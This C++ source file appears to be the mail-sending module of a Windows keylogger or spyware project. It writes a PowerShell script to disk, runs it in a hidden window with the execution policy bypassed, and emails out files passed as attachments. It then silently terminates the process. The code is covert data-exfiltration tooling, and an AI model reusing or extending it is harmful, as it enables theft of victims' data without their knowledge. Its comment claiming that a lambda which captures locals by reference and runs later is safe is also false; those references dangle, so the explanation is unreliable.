#include <fstream>
#include <algorithm>
#include <windows.h>

#include "IO.h"
#include "Timer.h"
#include "Utils.h"
#include "MailUtils.h"

#include "../Settings.h"

/**
 * Replaces all instatnces of a with
 * all instatnces of b in string s
 *
 * returns the new string
 **/
std::string StringReplace(std::string s, const std::string& a, const std::string& b)
{
	if (a.empty())
		return "";

	size_t sp = 0;

	// Update in the future
	while ((sp = s.find(a, sp)) != std::string::npos)
	{
		s.replace(sp, a.length(), b), sp += b.length();
	}

	return s;
}

// returns true if file exists, false otherwise
bool CheckFileExists(const std::string& path)
{
	std::ifstream file(path);
	bool exists = (bool)file;
	file.close();

	return exists;
}

// Creates the powershell script that sends mail
bool CreateScript()
{
	std::ofstream script(IO::GetOutputPath(true) + std::string(SCRIPT_NAME));

	if (!script)
		return false;
	script << MailUtils::PowerShellScript;

	if (!script)
		return false;

	script.close();
	return true;
}

Timer m_timer;

int MailUtils::SendMail(const std::string& subject, const std::string& body, const std::string& attatchment)
{
	bool ok;

	ok = IO::MkDir(IO::GetOutputPath(true));
	if (!ok)
		return -1;

	std::string scr_path = IO::GetOutputPath(true) + std::string(SCRIPT_NAME);
	if (!CheckFileExists(scr_path))
		ok = CreateScript();
	if (!ok)
		return -2;

	std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" +
		StringReplace(subject, "\"", "\\\"") + "\" -Body \"" +
		StringReplace(body, "\"", "\\\"") +
		"\" -Att \"" + attatchment + "\"";

	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "open";
	ShExecInfo.lpFile = "powershell";
	ShExecInfo.lpParameters = param.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	// Execute powershell script
	ok = (bool)ShellExecuteEx(&ShExecInfo);
	if (!ok)
		return -3;

	// Wait 7 seconds until script is done executing
	WaitForSingleObject(ShExecInfo.hProcess, 7000);

	// Get exit code of script execution through handle to the process
	DWORD exit_code = -1;
	GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

	/**
	 * Defines a lambda function that
	 * captures all surrounding variables
	 * (exit_code is the only one used) inside
	 * the lambda body by reference. This is
	 * why exit_code can be referenced inside
	 * the body even though it goes out of
	 * scope when the SendMail() function exits
	 **/
	m_timer.SetFunction([&]()
		{
			// Wait for 60 seconds to check status of script execution
			WaitForSingleObject(ShExecInfo.hProcess, 60000);

			// Get status
			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

			// If script is still running, then terminate it
			if ((int)exit_code == STILL_ACTIVE)
				TerminateProcess(ShExecInfo.hProcess, 100);

			// Log to debug file that if failed
			IO::WriteAppLog("<From SendMail> Return Code: " + Utils::ToString((int)exit_code));
		});

	// Run shell termination function asynchronously
	m_timer.SetRepeatCount(1L);
	m_timer.SetInterval(10L);
	m_timer.Start(true);

	return (int)exit_code;
}

int MailUtils::SendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& att)
{
	std::string attatchments = "";
	if (att.size() == 1U)
		attatchments = att[0];
	else
	{
		for (const auto& v : att)
			attatchments += v + "::";
		attatchments = attatchments.substr(0, attatchments.length() - 2);
	}
	return SendMail(subject, body, attatchments);
}

